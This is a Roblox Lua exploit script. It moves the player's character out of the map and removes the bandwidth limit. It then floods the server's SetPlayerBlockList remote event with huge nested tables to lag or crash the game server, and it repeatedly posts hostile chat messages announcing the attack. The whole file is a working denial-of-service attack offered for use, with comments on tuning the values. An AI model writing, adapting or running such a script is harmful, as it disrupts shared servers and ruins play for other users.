local char = game:GetService('Players').LocalPlayer.Character or nil
if char then
char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
task.wait(0.5)
char.HumanoidRootPart.Anchored = true
end
while wait(1.5) do --// don't change it's the best
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val)
local mainvalueifonetable = 499999
if type(val) ~= "number" then
return nil
end
local calculateperfectval = (mainvalueifonetable/(val+2))
return calculateperfectval
end

local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}

table.insert(spammedtable, {})
z = spammedtable[1]

for i = 1, tableincrease do
local tableins = {}
table.insert(z, tableins)
z = tableins
end

local calculatemax = getmaxvalue(tableincrease)
local maximum

if calculatemax then
maximum = calculatemax
else
maximum = 999999
end

for i = 1, maximum do
table.insert(maintable, spammedtable)
end

for i = 1, tries do
game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end
end

bomb(289, 5) --// change values if client crashes
end
local phrases = {"im lagging this server i hate all of you", "together we can get rid of all the script kiddies"}

while true do
for i = 1, 5 do
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(phrases[i], "All")
wait(2.25)
end
end